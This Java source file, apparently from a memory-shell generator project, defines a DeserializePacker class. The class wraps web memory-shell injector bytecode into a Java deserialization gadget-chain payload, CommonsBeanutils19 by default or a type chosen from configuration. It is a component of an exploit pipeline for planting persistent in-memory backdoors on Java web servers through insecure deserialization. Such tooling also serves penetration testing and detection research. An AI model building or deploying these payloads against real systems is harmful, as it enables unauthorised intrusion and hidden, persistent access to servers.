package com.reajason.javaweb.memsell.packer;

import com.reajason.javaweb.config.GenerateResult;
import com.reajason.javaweb.deserialize.DeserializeConfig;
import com.reajason.javaweb.deserialize.DeserializeGenerator;
import com.reajason.javaweb.deserialize.PayloadType;
import lombok.SneakyThrows;

import java.util.Map;

/**
 * @author ReaJason
 * @since 2024/12/10
 */
public class DeserializePacker implements Packer {

    @Override
    @SneakyThrows
    public byte[] pack(GenerateResult generateResult) {
        DeserializeConfig deserializeConfig = new DeserializeConfig();
        deserializeConfig.setPayloadType(PayloadType.CommonsBeanutils19);
        return DeserializeGenerator.generate(generateResult.getInjectorBytes(), deserializeConfig);
    }

    @Override
    public byte[] pack(GenerateResult generateResult, Map<String, ?> config) {
        String payloadType = (String) config.get("payloadType");
        DeserializeConfig deserializeConfig = new DeserializeConfig();
        deserializeConfig.setPayloadType(PayloadType.getPayloadType(payloadType));
        return DeserializeGenerator.generate(generateResult.getInjectorBytes(), deserializeConfig);
    }
}